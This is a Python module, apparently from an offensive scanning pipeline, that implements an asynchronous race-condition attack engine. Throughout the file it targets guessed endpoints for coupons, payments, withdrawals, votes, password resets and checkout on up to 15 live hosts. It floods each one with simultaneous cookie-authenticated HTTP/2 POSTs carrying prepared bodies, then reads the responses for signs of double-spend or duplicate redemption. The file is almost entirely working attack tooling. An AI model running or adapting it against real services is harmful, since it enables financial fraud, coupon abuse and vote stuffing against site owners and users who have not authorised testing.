#!/usr/bin/env python3
# engines/race_engine_v7.py — V7 Async Race Condition Engine
# Uses asyncio + HTTP/2 multiplexing for precise timing attacks
# MilkyWay Intelligence | Author: Sharlix

import asyncio
import re
import time
import urllib.parse
from typing import List, Optional

RACE_ENDPOINTS = [
    ("/api/coupon/apply",       "coupon_abuse"),
    ("/api/redeem",             "coupon_abuse"),
    ("/api/vote",               "vote_stuffing"),
    ("/api/like",               "vote_stuffing"),
    ("/api/transfer",           "double_spend"),
    ("/api/payment",            "double_spend"),
    ("/api/withdraw",           "double_spend"),
    ("/api/order",              "order_race"),
    ("/api/register",           "duplicate_reg"),
    ("/password/reset",         "token_reuse"),
    ("/api/password/reset",     "token_reuse"),
    ("/api/referral/claim",     "referral_abuse"),
    ("/api/points/redeem",      "points_abuse"),
    ("/checkout",               "checkout_race"),
    ("/api/inventory/reserve",  "inventory_race"),
]

RACE_INDICATORS = [
    "duplicate", "already applied", "used twice", "multiple times",
    "concurrent", "race", "already claimed", "limit exceeded",
    "insufficient funds", "balance changed", "order already",
]


class RaceEngineV7:
    """
    V7 Race Condition Engine.

    Techniques:
    1. asyncio.gather — simultaneous coroutines
    2. HTTP/2 multiplexing — single TCP connection, parallel streams
    3. Last-byte synchronization — prepare requests, release simultaneously
    4. Turbo Intruder style — detect timing differences

    Targets:
    - Coupon/promo codes (double redeem)
    - Vote/like endpoints (stuffing)
    - Balance transfers (double spend)
    - Password reset tokens (token reuse)
    - Order placement (inventory race)
    """

    def __init__(self, pipeline):
        self.p   = pipeline
        self.log = pipeline.log

    def run(self):
        """Synchronous entry point — runs async engine."""
        asyncio.run(self._async_run())

    async def _async_run(self):
        out   = self.p.files.get("race_results","") or f"{self.p.out}/{self.p.prefix}_race_v7.txt"
        live  = self.p.files.get("live_hosts","")
        urls  = self.p.files.get("urls","")
        found = 0

        from core.utils import safe_read
        hosts = safe_read(live)[:15]
        all_urls = safe_read(urls)

        if not hosts:
            self.log.warn("Race V7: no live hosts"); return

        self.log.info(f"Race V7: async testing {len(hosts)} hosts")

        from core.http_client import AsyncHTTPClient
        async with AsyncHTTPClient(timeout=15, max_connections=50,
                                   http2=True) as client:

            for host in hosts:
                host = host.rstrip("/")

                # Test 1: Known race-prone paths
                for path, vuln_type in RACE_ENDPOINTS[:10]:
                    url = host + path
                    result = await self._test_race(client, url, vuln_type)
                    if result:
                        detail, n_success = result
                        with open(out,"a") as f:
                            f.write(f"RACE_{vuln_type.upper()}: {url} | {detail}\n")
                        self.p.add_finding(
                            severity  = "high",
                            vuln_type = f"RACE_{vuln_type.upper()}",
                            url       = url,
                            detail    = detail,
                            tool      = "race-engine-v7",
                        )
                        found += 1

                # Test 2: Discovered endpoints from crawl
                discovered_race = [u for u in all_urls if host in u and
                                   any(ep in u for ep, _ in RACE_ENDPOINTS)]
                for url in discovered_race[:10]:
                    vuln_type = self._guess_vuln_type(url)
                    result = await self._test_race(client, url, vuln_type)
                    if result:
                        detail, _ = result
                        with open(out,"a") as f:
                            f.write(f"RACE_DISCOVERED: {url} | {detail}\n")
                        self.p.add_finding("high","RACE_CONDITION",url,detail,"race-v7")
                        found += 1

        self.log.success(f"Race V7: {found} race conditions found")

    async def _test_race(self, client, url: str, vuln_type: str,
                          n_threads: int = 15) -> Optional[tuple]:
        """
        Core race condition test.

        Strategy:
        1. Quick probe — does endpoint exist?
        2. If yes, flood with N simultaneous requests
        3. Analyze responses for race indicators
        """
        # Probe
        probe = await client.get(url)
        if not probe or probe.get("status") in (404, 405, 0):
            return None

        cookie = getattr(self.p.args,"cookie",None)
        auth_headers = {"Cookie": cookie} if cookie else {}

        # Prepare body based on vuln type
        body = self._prepare_body(vuln_type)

        # HTTP/2 flood — all requests simultaneous
        start   = time.time()
        results = await client.flood(url, method="POST", data=body,
                                      headers=auth_headers, count=n_threads)
        elapsed = time.time() - start

        if not results:
            return None

        valid_results = [r for r in results if isinstance(r, dict) and r.get("status",0) > 0]
        ok_count      = sum(1 for r in valid_results if r.get("status",0) in (200,201,202))
        all_bodies    = " ".join(r.get("body","")[:200] for r in valid_results).lower()

        # Detection signals
        signals = []

        # Signal 1: Multiple 200s where only 1 should succeed
        if ok_count >= int(n_threads * 0.3):
            signals.append(f"{ok_count}/{n_threads} requests succeeded simultaneously")

        # Signal 2: Race condition keywords in responses
        for kw in RACE_INDICATORS:
            if kw in all_bodies:
                signals.append(f"Race indicator: '{kw}'")
                break

        # Signal 3: Timing anomaly (too fast = server didn't mutex)
        if elapsed < 0.5 and ok_count > 1:
            signals.append(f"Suspicious speed: {elapsed:.2f}s for {n_threads} requests")

        # Signal 4: Varying response lengths (inconsistent state)
        bodies = [r.get("body","") for r in valid_results if r.get("status")==200]
        if bodies and len(set(len(b) for b in bodies)) > 2:
            signals.append("Variable response lengths — inconsistent server state")

        if signals:
            detail = f"[HTTP/2 flood n={n_threads}] {' | '.join(signals[:3])}"
            return (detail, ok_count)

        return None

    def _prepare_body(self, vuln_type: str) -> bytes:
        """Prepare appropriate POST body for the endpoint type."""
        import urllib.parse
        bodies = {
            "coupon_abuse"  : b"coupon=RACE10&code=TESTCODE",
            "vote_stuffing" : b"vote=1&item_id=test",
            "double_spend"  : b"amount=100&to_account=test",
            "order_race"    : b"product_id=1&quantity=1",
            "duplicate_reg" : b"username=racetest&email=race@test.com&password=Test123!",
            "token_reuse"   : b"email=test@example.com",
            "referral_abuse": b"code=REFER123",
            "points_abuse"  : b"points=100&reward_id=1",
            "inventory_race": b"item_id=1&quantity=1",
            "checkout_race" : b"cart_id=test&payment_method=card",
        }
        return bodies.get(vuln_type, b"test=race_condition")

    def _guess_vuln_type(self, url: str) -> str:
        url_lower = url.lower()
        for path, vtype in RACE_ENDPOINTS:
            if path.lower() in url_lower:
                return vtype
        return "race_condition"
